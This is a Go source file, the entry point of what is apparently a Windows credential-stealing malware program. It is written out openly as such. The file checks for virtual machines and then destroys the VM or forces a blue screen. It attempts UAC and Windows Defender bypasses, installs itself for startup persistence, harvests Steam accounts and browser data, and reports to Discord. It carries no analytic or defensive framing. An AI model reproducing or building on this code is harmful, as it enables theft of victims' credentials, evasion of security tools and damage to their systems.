package main

import (
	"log"
	"os"
	"runtime"
	"strings"
)

var modulesEnabled string

func main() {
	if runtime.GOOS != "windows" {
		return
	}

	if IsVM() && strings.Contains(modulesEnabled, "antivm") {
		if strings.Contains(modulesEnabled, "vmdestroy") {
			FuckUpVM()
		} else if strings.Contains(modulesEnabled, "bsod") {
			TriggerBSOD()
		}
		return
	}

	isUacBypass := len(os.Args) > 1 && os.Args[1] == "uacbypass"
	isAdmin := IsRunningAsAdmin()
	switch {
	case isAdmin, isUacBypass:
		log.Println("Running with elevated privileges")
		defenderBypass()
	default:
		log.Println("Attempting UAC bypass...")
		bypassUAC()
		return
	}

	if strings.Contains(modulesEnabled, "startup") {
		_ = AddToStartup()
	}
	if strings.Contains(modulesEnabled, "steam") {
		_ = FindSteamAccounts()
	}
	if strings.Contains(modulesEnabled, "browsers") {
		GrabBrowsersData()
	}
	_ = SendDiscordNotification()
}
